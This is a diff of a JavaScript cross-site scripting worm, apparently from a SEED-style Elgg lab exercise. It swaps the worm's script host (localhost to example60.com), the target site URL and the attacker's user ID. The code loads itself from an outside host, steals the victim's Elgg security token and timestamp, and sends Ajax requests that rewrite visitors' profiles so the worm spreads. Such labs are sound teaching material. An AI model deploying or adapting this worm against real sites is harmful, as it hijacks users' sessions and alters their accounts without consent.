@@ -1,6 +1,6 @@
 /*** xss attack: link method
 Put this line below in the attacker's profile:
-<script type="text/javascript" src="http://localhost/xssworm.js"></script>
+<script type="text/javascript" src="http://example60.com/xssworm.js"></script>
 */
 window.onload = function(){
     alert("I'm triggered");
@@ -9,7 +9,7 @@ window.onload = function(){
   var wormCode = encodeURIComponent(
     "<script type=\"text/javascript\" " +
     "id = \"worm\" " +
-    "src=\"http://localhost/xssworm.js\">" +
+    "src=\"http://example60.com/xssworm.js\">" +
     "</" + "script>"
     ); 
 
@@ -24,11 +24,11 @@ window.onload = function(){
   var token = "&__elgg_token="+elgg.security.token.__elgg_token;
 
   // Set the URL
-  var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+  var sendurl="http://www.seed-server.com/action/profile/edit";
   var content = token + ts + name + desc + guid;
 
   // Construct and send the Ajax request
-  attackerguid = 47;
+  attackerguid = 59;
   if (elgg.session.user.guid != attackerguid){
     //Create and send Ajax request to modify profile
     var Ajax=null;
